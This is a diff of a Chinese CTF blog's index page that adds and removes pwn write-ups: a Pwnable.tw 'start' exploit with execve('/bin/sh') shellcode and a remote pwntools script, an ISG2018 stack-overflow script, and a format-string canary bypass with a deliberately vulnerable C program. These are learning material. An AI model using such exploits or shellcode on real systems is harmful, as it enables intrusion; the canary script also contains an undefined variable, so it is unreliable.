+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">pwn,ROP</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -272,187 +395,27 @@
 
 
   
-    <article id="post-Pwnable.tw.start" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Pwnable-tw-start"><a href="#Pwnable-tw-start" class="headerlink" title="Pwnable.tw.start"></a><strong>Pwnable.tw.start</strong></h3><h4 id="拿到题目"><a href="#拿到题目" class="headerlink" title="拿到题目"></a><strong>拿到题目</strong></h4><p>32位，小端，静态编译，保护全关<br><img src="/2019/09/10/Pwnable.tw.start/42f00637996ec6ee010976e734bb4f3e.png" alt></p>
-<h4 id="运行一下"><a href="#运行一下" class="headerlink" title="运行一下"></a><strong>运行一下</strong></h4><p>输入超长字符串，程序Crash掉<br><img src="/2019/09/10/Pwnable.tw.start/9e8d630428e96afb7333aa69a7847980.png" alt></p>
-<h4 id="拖入IDA"><a href="#拖入IDA" class="headerlink" title="拖入IDA"></a><strong>拖入IDA</strong></h4><p><img src="/2019/09/10/Pwnable.tw.start/0adf2605788cc8aceeb99dd3c410b539.png" alt><br>start函数里，先write出“Let’s start the CTF:”,之后输入。<br>因为对write和read对栈的影响不太熟悉,所以gdb调试一下。<br>第一次int 80h后，栈并没有pop出值，并且是从ecx中拿到存放字符串的地址。edx存放字符串长度，ebx存放fd。<br><img src="/2019/09/10/Pwnable.tw.start/947c25798c9158f4a7533ff905f441fb.png" alt><br>第二次int 80h后，从ecx拿到字符串的地址，并在此写值。<br><img src="/2019/09/10/Pwnable.tw.start/8f1c0aa058a5b5bf1d2cd1c39b6e7e9c.png" alt></p>
-<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a><strong>思路</strong></h4><p>控制ret，指到我需要的地方，但是栈指针不知道，所以想办法先泄露出栈上的一个指针。注意到start在运行时，先push了esp和exit的地址，在ret后，之前push进去的esp就成了现在esp的值，那么可以利用write拿到之前push的esp，这样，我们就拿到了一个栈上的指针。</p>
-<p><img src="/2019/09/10/Pwnable.tw.start/4a61f97daea2591b6059e02cb244d0fc.png" alt><br>之后，就是正常的利用思路。<br>payload = ‘A’ * offset + shellcode_addr + shellcode</p>
-<h5 id="计算溢出偏移量"><a href="#计算溢出偏移量" class="headerlink" title="计算溢出偏移量"></a><strong>计算溢出偏移量</strong></h5><p><img src="/2019/09/10/Pwnable.tw.start/1be6e5cebcdaf7728080f71f0683a225.png" alt><br>溢出偏移量 offset = 20</p>
-<h5 id="计算shellcode-addr"><a href="#计算shellcode-addr" class="headerlink" title="计算shellcode_addr"></a><strong>计算shellcode_addr</strong></h5><p><img src="/2019/09/10/Pwnable.tw.start/77973a48820fee86086be01a0ea6ba9f.png" alt></p>
-<p>那么泄露出来的 esp:0xffffd430与shellcode_addr:0xffffd444的差值为0x14。其实，计算方法也可以是：之前push的esp与push后产生的新esp差值为4，那么新的esp就等于泄露出来的esp(旧的esp) - 4，所以shellcode_addr = 泄露出来的值 - 4 + 0x14 + 4(ret) = 泄露出来的值 + 0x14</p>
-<h5 id="书写shellcode"><a href="#书写shellcode" class="headerlink" title="书写shellcode"></a><strong>书写shellcode</strong></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">code  =  <span class="string">'''</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">mul ecx</span></span><br><span class="line"><span class="string">push eax</span></span><br><span class="line"><span class="string">push 0x68732F2F</span></span><br><span class="line"><span class="string">push 0x6E69622F</span></span><br><span class="line"><span class="string">mov ebx,esp</span></span><br><span class="line"><span class="string">mov al,0x0B</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">context(arch  =  <span class="string">'i386'</span>,  os  =  <span class="string">'linux'</span>,  endian  =  <span class="string">'little'</span>,  wordsize  =  <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">shellcode  =  asm(code).encode(<span class="string">'hex'</span>)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'[*] shellcode is %s '</span>  %  shellcode</span><br><span class="line"><span class="comment">#xor ecx,ecx与mul ecx 很巧妙，mul ecx将edx与eax同时置0</span></span><br></pre></td></tr></table></figure>
-
-<h4 id="完整的exp如下"><a href="#完整的exp如下" class="headerlink" title="完整的exp如下:"></a><strong>完整的exp如下</strong>:</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">makeShellcode</span><span class="params">()</span>:</span></span><br><span class="line">    code  =<span class="string">'''</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mul ecx</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">    push 0x68732F2F</span></span><br><span class="line"><span class="string">    push 0x6E69622F</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    mov al,0x0B</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line"></span><br><span class="line">    context(arch  =  <span class="string">'x86'</span>,os  =  <span class="string">'linux'</span>,  endian  =  <span class="string">'little'</span>  ,  word_size  =  <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    shellcode  =  asm(code).encode(<span class="string">'hex'</span>)</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] shellcode is %s'</span>  %  shellcode</span><br><span class="line">    <span class="keyword">return</span>  shellcode</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwnable_tw_start</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  remote(<span class="string">'chall.pwnable.tw'</span>,<span class="number">10000</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'Let\'s start the CTF:'</span>)</span><br><span class="line">    <span class="comment">#leak Oldesp and calculate shellcode_addr</span></span><br><span class="line">    s.send(<span class="string">'A'</span>  *  <span class="number">20</span>  +  p32(<span class="number">0x08048087</span>))</span><br><span class="line">    Oldesp  =  u32(s.recv(<span class="number">4</span>))</span><br><span class="line">    shellcode_addr  =  Oldesp  +  <span class="number">0x14</span></span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'[*] shellcode_addr is %s'</span>  %  hex(shellcode_addr)</span><br><span class="line">    <span class="comment">#Get shell</span></span><br><span class="line">    shellcode  =  makeShellcode()</span><br><span class="line">    payload  =  <span class="string">'A'</span>  *  <span class="number">20</span>  +  p32(shellcode_addr)+binascii.a2b_hex(shellcode)</span><br><span class="line">    s.send(payload)</span><br><span class="line">    s.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwnable_tw_start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"><span class="comment">#FLAG&#123;Pwn4bl3_tW_1s_y0ur_st4rt&#125;</span></span><br></pre></td></tr></table></figure>
-
-<h5 id="运行结果如图："><a href="#运行结果如图：" class="headerlink" title="运行结果如图："></a><strong>运行结果如图：</strong></h5><p><img src="/2019/09/10/Pwnable.tw.start/a932583c9a566cb25c62ffa7ec11f282.png" alt></p>
-<h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a><strong>注释</strong></h4><p>系统调用表：<a href="http://syscalls.kernelgrok.com/" target="_blank" rel="noopener">http://syscalls.kernelgrok.com/</a><br><img src="/2019/09/10/Pwnable.tw.start/4c55e1f5766990deff0c14d19bc2528d.png" alt></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/Pwnable.tw.start/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-简单栈溢出" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="简单栈溢出"><a href="#简单栈溢出" class="headerlink" title="简单栈溢出"></a><strong>简单栈溢出</strong></h3><p>ISG2018 可能是最简单的一道栈溢出的题目…（但愚蠢的我没有注意到那个handler函数….）<br>溢出点不在他让你overflow的地方，在handler函数里<br><img src="/2019/09/10/简单栈溢出/cf05965825972578816647552cdc2851.png" alt><br>在这里v1没有限制输入，利用v1覆盖v2shell,直接得shell<br>偏移量为 0x110 - 0x108 = 8<br>那么构造payload为 ‘a’ * 8 +’/bin/sh’<br>脚本如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  remote(<span class="string">'202.120.7.206'</span>,  <span class="number">60010</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    s.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'Overflow me'</span>)</span><br><span class="line">    s.sendline(<span class="string">'b'</span>  *  <span class="number">50</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'[N]'</span>)</span><br><span class="line">    s.sendline(<span class="string">'a'</span>  *  <span class="number">8</span>  +  <span class="string">'/bin/sh'</span>)</span><br><span class="line">    s.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>运行结果如图<br><img src="/2019/09/10/简单栈溢出/78421ec1a7f37ffb413a989314d3463f.png" alt="1535687009338.png"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/简单栈溢出/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-Canary绕过(格式化字符串利用)" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="Canary绕过-格式化字符串利用"><a href="#Canary绕过-格式化字符串利用" class="headerlink" title="Canary绕过(格式化字符串利用)"></a><strong>Canary绕过(格式化字符串利用)</strong></h3><h3 id="漏洞代码"><a href="#漏洞代码" class="headerlink" title="漏洞代码:"></a><strong>漏洞代码:</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">   system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span>  <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   setbuf(<span class="built_in">stdin</span>,  <span class="literal">NULL</span>);</span><br><span class="line">   setbuf(<span class="built_in">stdout</span>,  <span class="literal">NULL</span>);</span><br><span class="line">   setbuf(<span class="built_in">stderr</span>,  <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span>  <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span>  i;</span><br><span class="line">   init();</span><br><span class="line">   <span class="keyword">char</span>  buf[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span>  i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">"%s"</span>,&amp;buf);</span><br><span class="line">      <span class="built_in">printf</span>(buf);  <span class="comment">//vul</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span>  <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a><strong>原理：</strong></h3><p>利用格式化字符串漏洞泄露出canary的值，利用main函数的ret拿到shell</p>
-<h3 id="具体实现："><a href="#具体实现：" class="headerlink" title="具体实现："></a><strong>具体实现：</strong></h3><h4 id="找到canary的位置："><a href="#找到canary的位置：" class="headerlink" title="找到canary的位置："></a><strong>找到canary的位置：</strong></h4><p><img src="/2019/09/10/Canary绕过(格式化字符串利用)/183de8fcd52b9b29d4fd53fa7fd67590.png" alt><br>在进入main函数后将canary的值储存在$ebp - 0xc的地方<img src="/2019/09/10/Canary绕过(格式化字符串利用)/1f9ac97d03e5f8da123832a1faca2f84.png" alt></p>
-<h4 id="找到存储字符串的地址："><a href="#找到存储字符串的地址：" class="headerlink" title="找到存储字符串的地址："></a><strong>找到存储字符串的地址：</strong></h4><p><img src="/2019/09/10/Canary绕过(格式化字符串利用)/f06e293b9d77341a1e5af0033b7df246.png" alt></p>
-<h4 id="计算偏移："><a href="#计算偏移：" class="headerlink" title="计算偏移："></a><strong>计算偏移：</strong></h4><p>(0x37c - 0x304) / 4 = 30 所以canary在偏移31的地方</p>
-<h4 id="找到main函数的ret地址"><a href="#找到main函数的ret地址" class="headerlink" title="找到main函数的ret地址:"></a><strong>找到main函数的ret地址:</strong></h4><p><img src="/2019/09/10/Canary绕过(格式化字符串利用)/a071431c124bace0697ab210d7b66ab0.png" alt><br>这段代码需要注意下：因为eip指向ret时，esp的值就是ret的地址。<br>那么代码的执行效果如下：<br>pop ecx后，ecx = 0xbffff3a0<br>pop ebx后，ebx = 0x0<br>pop ebp后，ebp = 0x0</p>
-<p>lea esp,[ecx-0x4]后，esp = *(ecx - 0x4) = *(0xbffff3a0 - 0x4) = *(0xbffff39c) = 0xb7df1e81</p>
-<p>如下：<br><img src="/2019/09/10/Canary绕过(格式化字符串利用)/b7b8e1c128f9b8f531aef4de99ec0186.png" alt><br>那么将下面的图补充完整：<br><img src="/2019/09/10/Canary绕过(格式化字符串利用)/f06e293b9d77341a1e5af0033b7df246.png" alt><br>0xbffff380存储了之后将要pop出的ecx的值<br>那么需要在这里伪造出getshell的地址 + 4，那么之后pop ecx, esp = *(&amp;getshell + 4 - 4) = getshell</p>
-<h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><p>from  pwn  import  *</p>
-<p>s  =  process(‘./cannry’)<br>libc  =  ELF(‘./cannry’)</p>
-<p>#context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p>
-<p>#gdb.attach(proc.pidof(s)[0])<br>shell_addr  =  libc.symbols[‘getshell’]<br>payload  =  ‘%31$x,%x’<br>s.sendline(payload)<br>res  =  s.recv()<br>cannry_addr  =  int(res.split(‘,’)[0],16)<br>arr_addr  =  int(res.split(‘,’)[1],16)  +  4<br>print  ‘cannry_addr is : ‘  +  hex(cannry_addr)<br>print  ‘arr_addr is : ‘  +  hex(arr_addr)</p>
-<p>payload  =  p32(shell_addr)  +  ‘a’  *  96  +  p32(cannry_addr)  +  p32(arr_shell)</p>
-<p>print  ‘[*] payload is : ‘  +  payload<br>s.sendline(payload)<br>s.interactive()</p>
-<p><img src="/2019/09/10/Canary绕过(格式化字符串利用)/75dbb4fe9594be97c4d081af6151fe72.png" alt></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/Canary绕过(格式化字符串利用)/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
     <article id="post-ROP之ret2dlresolve" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/ROP之ret2dlresolve/">ROP之ret2dlresolve</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/ROP之ret2dlresolve/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
+    
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="ROP之ret2dlresolve"><a href="#ROP之ret2dlresolve" class="headerlink" title="ROP之ret2dlresolve"></a><strong>ROP之ret2dlresolve</strong></h3><p>首先以一个程序看起，了解其真正的延迟加载过程</p>
+        <h3 id="ROP之ret2dlresolve"><a href="#ROP之ret2dlresolve" class="headerlink" title="ROP之ret2dlresolve"></a>ROP之ret2dlresolve</h3><p>首先以一个程序看起，了解其真正的延迟加载过程</p>
 <p><img src="/2019/09/10/ROP之ret2dlresolve/e80712df161361a0b45af9cbcc49dc21.png" alt="1.png"></p>
 <p>这里call 了read函数，由于是第一次调用，所以需要从libc中查找出对应函数，来研究下它具体的过程是如何的。</p>
 <p>si步入，其进入了read的plt表，并且将要跳转，由图可知，他其实就是跳转到其下一条语句并且会push一个0</p>
@@ -480,6 +443,17 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">pwn,ROP,ret2dlresolve</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
@@ -514,74 +488,30 @@
 
 
   
-    <article id="post-GIT游戏" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-简单栈溢出" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/简单栈溢出/">简单栈溢出</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/简单栈溢出/" class="archive-article-date">
+  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
+</a>
+        
+      </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>GIT游戏</p>
-<p><a href="http://[https://learngitbranching.js.org/]" target="_blank" rel="noopener">学习网址 [https://learngitbranching.js.org/]</a></p>
-<ol>
-<li><p>git checkout -b bugFix 创建名为bugFix的分支并切换过去</p>
-</li>
-<li><p>git checkout -b foo o/master 创建一个foo分支，追踪o/master分支，并转到foo分支上</p>
-</li>
-<li><p>git branch -u o/master foo  使得 foo 跟踪 o/master 。如果当前就在 foo 分支上, 还可以省略 foo</p>
-</li>
-<li><p>git merge 合并所有分支</p>
-</li>
-<li><p>git merge bugFix 在当前分支(HEAD指向的位置)上合并bugFix分支</p>
-</li>
-<li><p>git rebase master 合并当前分支到master分支</p>
-</li>
-<li><p>git rebase o/master side1 把side1合并到o/master上</p>
-</li>
-<li><p>git rebase -i HEAD~4 交互rebase，分支为HEAD上移4位的分支</p>
-</li>
-<li><p>git symbolic-ref HEAD 查看head指针所指的位置</p>
-</li>
-<li><p>git checkout a1c58 分离head,将head指向a1c58</p>
-</li>
-<li><p>使用 ^ 向上移动 1 个提交记录</p>
-</li>
-<li><p>使用 ~<num> 向上移动多个提交记录，如 ~3</num></p>
-</li>
-<li><p>git branch -f master HEAD~3 会将 master 分支强制指向 HEAD 的第 3 级父提交。</p>
-</li>
-<li><p>git branch -f bugFix c0 把bugFix强制移到c0处</p>
-</li>
-<li><p>git reset HEAD~1 把head指针移向他的第一级父提交 此时的结构 c2 -&gt; c1(master*)</p>
-</li>
-<li><p>git revert HEAD head指针下移，此时的结构 c1’(master*) -&gt; c2 -&gt; c1</p>
-</li>
-<li><p>git cherry-pick &lt;提交号&gt; 把这个提交放在head下面</p>
-</li>
-<li><p>交互式 rebase 指的是使用带参数 –interactive 的 rebase 命令, 简写为 -i</p>
-</li>
-<li><p>git tag v1 c1 在c1处打上v1的标签，如果不指定c1,则默认为HEAD指向的位置</p>
-</li>
-<li><p>git describe用来描述离你最近的锚点(也就是标签),能帮你在提交历史中移动了多次以后找到方向；当你用 git bisect（一个查找产生 Bug 的提交记录的指令）找到某个提交记录时，或者是当你坐在你那刚刚度假回来的同事的电脑前时， 可能会用到这个命令</p>
-</li>
-<li><p>git describe <ref> 默认ref为HEAD</ref></p>
-</li>
-<li><p>git checkout HEAD<del>^2</del>2 第一个<del>HEAD指针上移，^2HEAD指针指向他的第二个父节点，</del>2HEAD上移2个</p>
-</li>
-<li><p>git pull 就是 fetch 和 merge 的简写，类似的 git pull –rebase 就是 fetch 和 rebase</p>
-</li>
-<li><p>git pull origin master 从远程仓库获取master分支到本地，然后merge</p>
-</li>
-<li><p>git pull origin master:foo 本地创建一个foo分支，远程仓库下载master分支，合并到foo分支上，在merge</p>
-</li>
-<li><p>git push <remote> <place> ,git push origin master:切到本地仓库中的“master”分支，获取所有的提交，再到远程仓库“origin”中找到“master”分支，将远程仓库中没有的提交记录都添加上去，搞定之后告诉我</place></remote></p>
-</li>
-<li><p>git push origin <source>:<destination>,git push origin foo^:master 把foo的第1级父提交指向的节点送给远程master分支，如果不存在，则创建后在送</destination></p>
-</li>
-<li><p>git push origin :foo push空source到远程仓库，会删除远程仓库的foo分支</p>
-</li>
-<li><p>git fetch origin :bar fetch空的source到本地，会在本地创建一个新分支</p>
-</li>
-</ol>
-<p><img src="/2019/09/10/GIT游戏/50fadb7d7c2a70c07ec3ef338c1e7bec.jpg" alt="git.jpg"></p>
+        <h3 id="简单栈溢出"><a href="#简单栈溢出" class="headerlink" title="简单栈溢出"></a>简单栈溢出</h3><p>ISG2018 可能是最简单的一道栈溢出的题目…（但愚蠢的我没有注意到那个handler函数….）<br>溢出点不在他让你overflow的地方，在handler函数里<br><img src="/2019/09/10/简单栈溢出/cf05965825972578816647552cdc2851.png" alt><br>在这里v1没有限制输入，利用v1覆盖v2shell,直接得shell<br>偏移量为 0x110 - 0x108 = 8<br>那么构造payload为 ‘a’ * 8 +’/bin/sh’<br>脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  remote(<span class="string">'202.120.7.206'</span>,  <span class="number">60010</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'name:'</span>)</span><br><span class="line">    s.sendline(<span class="string">'aaaa'</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'Overflow me'</span>)</span><br><span class="line">    s.sendline(<span class="string">'b'</span>  *  <span class="number">50</span>)</span><br><span class="line">    s.recvuntil(<span class="string">'[N]'</span>)</span><br><span class="line">    s.sendline(<span class="string">'a'</span>  *  <span class="number">8</span>  +  <span class="string">'/bin/sh'</span>)</span><br><span class="line">    s.interactive()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>运行结果如图<br><img src="/2019/09/10/简单栈溢出/78421ec1a7f37ffb413a989314d3463f.png" alt="1535687009338.png"></p>
 
       
 
@@ -590,11 +520,190 @@
     <div class="article-info article-info-index">
       
       
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">pwn,栈,溢出</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
       
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/GIT游戏/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/09/10/简单栈溢出/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-格式化字符串漏洞利用" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/09/10/格式化字符串漏洞利用/">格式化字符串漏洞利用</a>
+    </h1>
+  
+
+        
+        <a href="/2019/09/10/格式化字符串漏洞利用/" class="archive-article-date">
